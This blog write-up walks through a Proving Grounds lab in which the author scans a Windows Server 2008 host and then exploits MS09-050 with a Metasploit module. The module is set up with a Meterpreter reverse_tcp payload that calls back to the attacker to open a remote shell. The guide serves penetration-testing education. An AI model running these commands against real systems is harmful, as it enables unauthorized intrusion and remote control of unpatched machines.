---
title: "[Easy] - Proving Grounds - Internal"
date: 2024-10-22T00:00:00+00:00
author: Mathijs Verschuuren
layout: post
permalink: /pg-internal/
categories: Labs
tags: [writeup]
---
Welcome to another Proving Grounds lab! In this session, we'll walk through the process of exploiting a Windows 2008 server. We'll leverage a variety of techniques, including vulnerability enumeration and Metasploit modules, to gain access to the machine.

## Discovery

We start off with a nmap scan and scan all open tcp ports using the '-p-' argument. The following output appears after waiting for the scan to complete.

```bash
sudo nmap -p- -vv -Pn -A -T4 -sV 192.168.239.40 -oA ./fulltcp
```

The scan completes and reveals that the target is a Windows 2008 Server. Notably, port 445 is open, which often indicates SMB (Server Message Block), and port 3389, typically used for Remote Desktop Protocol (RDP), is also open.

```bash
PORT      STATE SERVICE            REASON          VERSION
53/tcp    open  domain             syn-ack ttl 125 Microsoft DNS 6.0.6001 (17714650) (Windows Server 2008 SP1)
135/tcp   open  msrpc              syn-ack ttl 125 Microsoft Windows RPC
139/tcp   open  netbios-ssn        syn-ack ttl 125 Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds       syn-ack ttl 125 Microsoft Windows Server 2008 R2 microsoft-ds (workgroup: WORKGROUP)
3389/tcp  open  ssl/ms-wbt-server? syn-ack ttl 125
5357/tcp  open  http               syn-ack ttl 125 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
49152/tcp open  msrpc              syn-ack ttl 125 Microsoft Windows RPC
49153/tcp open  msrpc              syn-ack ttl 125 Microsoft Windows RPC
49154/tcp open  msrpc              syn-ack ttl 125 Microsoft Windows RPC
49155/tcp open  msrpc              syn-ack ttl 125 Microsoft Windows RPC
49156/tcp open  msrpc              syn-ack ttl 125 Microsoft Windows RPC
49157/tcp open  msrpc              syn-ack ttl 125 Microsoft Windows RPC
49158/tcp open  msrpc              syn-ack ttl 125 Microsoft Windows RPC
Service Info: Host: INTERNAL; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008::sp1, cpe:/o:microsoft:windows, cpe:/o:microsoft:windows_server_2008:r2
```

Upon further investigation, we find that Network Level Authentication (NLA) is not enforced on the RDP service, allowing us to probe the RDP login screen. This lack of NLA provides us with crucial information: usernames and operating system details are leaked on the login screen.

![image](https://github.com/user-attachments/assets/78dd432e-327c-4c2c-a487-bb3a20fcb25d)

Given the presence of port 445/tcp, we check if the server is vulnerable to the notorious MS17_010 (also known as EternalBlue), a vulnerability that can lead to remote code execution and was used in the infamous WannaCry ransomware attack. We perform a quick vulnerability scan for MS17_010.

The scan confirms that the machine appears vulnerable, 

![image](https://github.com/user-attachments/assets/8feea7b6-bb05-478a-8760-fa538f793d1b)

but when attempting to exploit it, we run into a STATUS_ACCESS_DENIED error. This indicates that the named pipes necessary to carry out the attack are inaccessible.

This step is crucial, as certain attacks, including EternalBlue, rely on accessing specific named pipes like srvsvc or spoolss. Unfortunately, none of the named pipes that we require are accessible, preventing us from exploiting MS17_010.

![image](https://github.com/user-attachments/assets/b7e161fa-ad57-47a3-b7db-6d308a166408)

### Another approach

After scanning all the services running on the target machine, we decided to use Nmap's --script vuln feature to check for any known vulnerabilities. In hindsight, it became clear that we might have dived too deep too quickly. Initially, we focused on specific attack vectors without fully exploring the overall landscape. Had we taken more time to enumerate and analyze the exposed services in detail from the beginning, we could have identified this vulnerability much earlier.

Thorough enumeration is often overlooked in favor of quicker exploitation attempts, but it’s a crucial step in any engagement. By taking the time to fully understand the environment, we can avoid missing out on valuable attack surfaces. In this case, had we conducted broader scans earlier, we would have spotted the SMB-related MS09-050 vulnerability right away, allowing us to streamline our approach and avoid unnecessary detours.

This serves as a reminder that, while diving deep into a particular service can sometimes yield results, a more methodical and patient approach to enumeration can save time and provide clearer insight into the full range of attack opportunities.
The output indicated that the target was vulnerable to MS09-050:

![image](https://github.com/user-attachments/assets/193b9898-c39c-477f-9e12-c6e668218640)

MS09-050 refers to a critical vulnerability in the Server Message Block Version 2 (SMBv2) protocol, specifically within the srv2.sys driver on affected Windows operating systems. This vulnerability, also known as CVE-2009-3103, was disclosed in September 2009 and affects Windows Vista, Windows Server 2008, and Windows 7 (pre-release versions). The flaw allows an attacker to craft a specially formed SMB packet and send it to a vulnerable system, which could lead to remote code execution due to a buffer overflow in the handling of the SMBv2 protocol.

This exploit became infamous not only for its severity but also because of its wormable nature. A wormable exploit can automatically propagate between systems without user interaction, making it particularly dangerous in unpatched environments, much like the later EternalBlue exploit that fueled the WannaCry ransomware outbreak in 2017. Wormable vulnerabilities like MS09-050 pose a significant risk to networks, as they can trigger widespread infections by hopping from one vulnerable machine to another, often within minutes.

While not as publicly destructive as EternalBlue, the MS09-050 exploit attracted significant attention in the security community because of the simplicity of the attack and the high privileges an attacker could gain. In an unpatched system, this vulnerability could allow an attacker to gain full control over a machine, potentially leading to the installation of malware, data exfiltration, or lateral movement within the target network.

Microsoft patched the vulnerability in a security update released in 2009, but the exploit remains a stark reminder of the importance of keeping systems up to date, especially in critical network services like SMB. Even now, older or misconfigured systems may still be susceptible, making it a prime target for legacy system attacks.
By reviewing our options, we determined that there is a readily available Metasploit module to exploit MS09-050. The exploit works by sending specially crafted SMB packets to the target system, which can trigger a buffer overflow in the srv2.sys driver, leading to remote code execution.

## Exploit

Here is how we proceeded with the exploitation:

First, we fired up Metasploit and used the following commands to load the appropriate module:

```bash
msfconsole -q
use exploit/windows/smb/ms09_050_smb2_negotiate_func_index
```

Next, we set our target details, including the IP address of the Windows Server 2008 machine:

```bash
set RHOST 192.168.239.40
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST tun0
set LPORT 443
```

With the settings configured, we initiated the exploit:

![image](https://github.com/user-attachments/assets/a97e0ec0-2eb6-4960-b234-e89d12adbd8c)

The exploit successfully delivered the payload and granted us a Meterpreter shell on the target system.

## Credits

Thank you for following along with this write-up! My aim is to document these processes for future reference while providing insights that can help others in their penetration testing journeys. By sharing the thought process and techniques used in real-world scenarios, I hope to make the concepts more accessible to beginners and intermediate learners alike.
